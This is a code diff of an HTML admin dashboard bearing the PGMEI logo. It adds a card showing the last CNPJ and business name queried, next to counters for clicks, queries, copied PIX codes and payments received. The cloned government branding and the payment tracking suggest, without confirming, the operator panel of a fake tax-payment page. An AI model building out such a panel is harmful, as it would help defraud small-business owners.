@@ -64,7 +64,6 @@
 <body>
     <div class="container-fluid">
         <div class="row">
-            <!-- Sidebar com logo PGMEI -->
             <div class="col-md-3 col-lg-2 px-0 sidebar">
                 <div class="p-3">
                     <img src="/index_files/logo-simples.png" alt="PGMEI" class="sidebar-logo">
@@ -85,6 +84,27 @@
             <div class="col-md-9 col-lg-10 content">
                 <div id="dashboard-view" style="display: block;">
                     <h2 class="mb-4"><i class="fas fa-tachometer-alt me-2"></i>Dashboard</h2>
+                    
+                    <!-- CARD DE ÚLTIMA CONSULTA -->
+                    <div class="row mb-4">
+                        <div class="col-md-12">
+                            <div class="card card-dashboard">
+                                <div class="card-body">
+                                    <h5 class="card-title text-muted">📌 Última Consulta Realizada</h5>
+                                    <div class="row">
+                                        <div class="col-md-6">
+                                            <strong>CNPJ:</strong> <span id="ultimo-cnpj-consultado" style="font-weight: bold; color: #0A4C62;">Carregando...</span>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <strong>Nome:</strong> <span id="ultimo-nome-consultado" style="color: #333;">Carregando...</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- CARDS DASHBOARD -->
                     <div class="row">
                         <div class="col-md-3 mb-3"><div class="card card-dashboard"><div class="card-body"><h5 class="card-title text-muted">Total de Cliques</h5><h2 id="total-clicks">0</h2></div></div></div>
                         <div class="col-md-3 mb-3"><div class="card card-dashboard"><div class="card-body"><h5 class="card-title text-muted">Total de Consultas</h5><h2 id="total-consultas">0</h2></div></div></div>
@@ -157,7 +177,6 @@
         </div>
     </div>
 
-    <!-- Modal de login -->
     <div class="modal fade" id="loginModal" data-bs-backdrop="static" tabindex="-1">
         <div class="modal-dialog">
             <div class="modal-content">
@@ -257,6 +276,10 @@
                 document.getElementById('total-pix-copiados').innerText = data.totalPixCopiados || 0;
                 document.getElementById('total-pagamentos').innerText = data.totalPagamentos || 0;
                 document.getElementById('valor-total-pago').innerText = 'R$ ' + (data.valorTotalPago || 0).toFixed(2).replace('.', ',');
+                
+                // Última consulta
+                document.getElementById('ultimo-cnpj-consultado').innerText = data.ultimaConsulta.cnpj || 'Nenhuma consulta';
+                document.getElementById('ultimo-nome-consultado').innerText = data.ultimaConsulta.nome || '-';
             } catch(e) { console.error(e); }
         }
 
